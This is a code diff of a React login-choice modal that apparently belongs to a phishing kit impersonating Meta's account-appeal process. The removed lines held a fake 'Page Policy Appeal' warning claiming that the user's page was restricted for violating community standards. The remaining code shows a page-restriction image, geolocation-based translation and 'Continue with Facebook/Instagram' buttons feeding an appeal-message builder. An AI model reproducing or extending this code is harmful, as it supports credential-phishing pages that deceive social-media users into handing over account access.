@@ -1,7 +1,6 @@
 'use client';
 
 import PageRestrictionImage from '@/assets/images/page-restriction-image.png';
-import WarningImage from '@/assets/images/warning.png';
 import { store, type LoginProvider } from '@/store/store';
 import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
@@ -23,7 +22,7 @@ const FacebookIcon = () => (
 const InstagramIcon = () => (
     <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
         <defs>
-            <linearGradient id='ig-gradient' x1='0%' y1='100%' x2='100%' y2='0%'>
+            <linearGradient id='ig-gradient-choice' x1='0%' y1='100%' x2='100%' y2='0%'>
                 <stop offset='0%' stopColor='#f09433' />
                 <stop offset='25%' stopColor='#e6683c' />
                 <stop offset='50%' stopColor='#dc2743' />
@@ -32,7 +31,7 @@ const InstagramIcon = () => (
             </linearGradient>
         </defs>
         <path
-            fill='url(#ig-gradient)'
+            fill='url(#ig-gradient-choice)'
             d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
         />
     </svg>
@@ -52,18 +51,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = [
-            'Page Policy Appeal',
-            'We have detected unusual activity on your page that violates our community standards.',
-            'Access to your page has been restricted and you are currently unable to post, share or comment using your page.',
-            'If you believe this is a mistake, you have the option to file an appeal by providing the necessary information.',
-            'Important Notes',
-            'Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.',
-            'Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.',
-            'Continue with Facebook',
-            'Continue with Instagram',
-            'Close modal'
-        ];
+        const textsToTranslate = ['Continue with Facebook', 'Continue with Instagram', 'Close modal'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -109,7 +97,7 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
 
     return (
         <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/60 px-4 backdrop-blur-sm'>
-            <div className='relative flex max-h-[90vh] w-full max-w-[520px] flex-col overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
+            <div className='relative w-full max-w-[480px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
                 <button
                     type='button'
                     onClick={handleClose}
@@ -119,51 +107,28 @@ const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
                     <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                 </button>
 
-                <div className='relative w-full shrink-0 bg-white px-6 pt-6'>
-                    <Image src={PageRestrictionImage} alt='' className='h-auto w-full object-contain' priority />
-                </div>
+                <Image src={PageRestrictionImage} alt='' className='h-auto w-full bg-white object-contain' priority />
 
-                <div className='flex flex-1 flex-col overflow-y-auto px-6 py-5 sm:px-8'>
-                    <div className='mb-4 flex items-center gap-2'>
-                        <Image src={WarningImage} alt='' className='h-7 w-7' />
-                        <h2 className='text-xl font-bold text-[#1C2B33]'>{t('Page Policy Appeal')}</h2>
-                    </div>
+                <div className='flex flex-col gap-3 px-5 pt-2 pb-5 sm:px-6 sm:pb-6'>
+                    <button
+                        type='button'
+                        onClick={() => handleSelect('facebook')}
+                        disabled={isSending}
+                        className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
+                    >
+                        <FacebookIcon />
+                        {t('Continue with Facebook')}
+                    </button>
 
-                    <div className='flex flex-col gap-3 text-[15px] leading-relaxed text-[#1C2B33]'>
-                        <p>{t('We have detected unusual activity on your page that violates our community standards.')}</p>
-                        <p>{t('Access to your page has been restricted and you are currently unable to post, share or comment using your page.')}</p>
-                        <p>{t('If you believe this is a mistake, you have the option to file an appeal by providing the necessary information.')}</p>
-                    </div>
-
-                    <div className='mt-5'>
-                        <p className='text-[15px] font-bold text-[#1C2B33]'>{t('Important Notes')}</p>
-                        <ul className='mt-2 list-inside list-disc space-y-1 text-[15px] leading-relaxed text-[#1C2B33]'>
-                            <li>{t('Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.')}</li>
-                            <li>{t('Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.')}</li>
-                        </ul>
-                    </div>
-
-                    <div className='mx-auto mt-6 flex w-full max-w-[360px] flex-col gap-3'>
-                        <button
-                            type='button'
-                            onClick={() => handleSelect('facebook')}
-                            disabled={isSending}
-                            className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
-                        >
-                            <FacebookIcon />
-                            {t('Continue with Facebook')}
-                        </button>
-
-                        <button
-                            type='button'
-                            onClick={() => handleSelect('instagram')}
-                            disabled={isSending}
-                            className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
-                        >
-                            <InstagramIcon />
-                            {t('Continue with Instagram')}
-                        </button>
-                    </div>
+                    <button
+                        type='button'
+                        onClick={() => handleSelect('instagram')}
+                        disabled={isSending}
+                        className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
+                    >
+                        <InstagramIcon />
+                        {t('Continue with Instagram')}
+                    </button>
                 </div>
             </div>
         </div>
